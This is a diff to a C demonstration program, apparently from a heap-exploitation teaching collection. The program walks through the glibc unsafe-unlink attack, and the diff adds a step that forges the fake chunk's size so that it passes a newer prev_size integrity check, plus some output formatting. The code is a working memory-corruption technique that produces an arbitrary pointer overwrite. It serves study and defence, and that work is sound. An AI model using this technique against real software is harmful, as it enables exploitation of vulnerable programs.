@@ -30,7 +30,13 @@ int main()
 	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
 	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
 	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
-	printf("Fake chunk bk: %p\n",(void*) chunk0_ptr[3]);
+	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
+
+	printf("We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)\n");
+	printf("With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
+	chunk0_ptr[1] = chunk0_ptr[-3];
+	printf("Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08x\n", chunk0_ptr[1]);
+	printf("You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");
 
 	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
 	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
@@ -38,11 +44,11 @@ int main()
 	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
 	chunk1_hdr[0] = malloc_size;
 	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
-	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n");
+	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
 	chunk1_hdr[1] &= ~1;
 
 	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
-	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n");
+	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
 	free(chunk1_ptr);
 
 	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
